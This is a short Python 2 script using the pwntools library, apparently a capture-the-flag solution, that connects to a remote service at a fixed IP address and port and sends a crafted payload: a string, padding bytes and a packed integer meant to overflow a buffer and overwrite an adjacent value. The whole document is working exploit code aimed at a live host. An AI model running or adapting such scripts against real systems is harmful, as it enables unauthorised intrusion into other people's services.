from pwn import *

s = remote("103.237.99.35", 26121)
s.recv()

payload = "1234" + "a"*8 + "\x01\x00\x00\x00"

s.sendline(payload)
print s.recvuntil("4")
print s.recv()
s.close()
